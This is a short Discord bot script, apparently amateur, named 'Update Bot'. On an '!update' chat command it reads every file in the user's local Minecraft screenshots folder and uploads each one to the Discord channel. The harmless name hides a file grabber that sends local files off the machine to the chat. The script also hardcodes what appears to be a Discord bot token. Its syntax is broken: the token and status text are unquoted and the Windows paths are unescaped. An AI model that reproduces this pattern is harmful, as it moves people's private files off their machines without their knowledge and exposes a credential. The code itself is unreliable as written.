//bot.js
//anything with "//" infront of it is treated as a comment, it doesn't affect the code of the bot
const Discord = require('discord.js');
var client = new Discord.Client();
const prefix = "!";
var NOTIFY_CHANNEL;

client.on('ready', () => {
    client.user.setPresence({ game: { name: !help, type: 0 } });
    console.log('successfully Logged In As Update Bot!');
}); 

client.on ('message', message => {
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();  
  const testFolder = 'C:\Users\%USERNAME%\AppData\Roaming\.minecraft\screenshots\';
  const fs = require('fs');
  if (command === "update") {
      function remove() {
               message.channel.send("test") }
           setTimeout(remove, 3000)
      fs.readdirSync(testFolder).forEach(file => {
           let file2 = "C:\Users\%USERNAME%\AppData\Roaming\.minecraft\screenshots\" + file
           console.log(file2);
           message.channel.send(`Here you go.`, {
              files: [
                 file2
              ]
            })
   
      })
}});

//LOGIN TOKEN-------------------------------------------------------------------
client.login(NDA3NTkzODIzOTIxNzY2NDEw.DVIqzw.tVwiSN30_4x6LexUutYETZlyNAU);
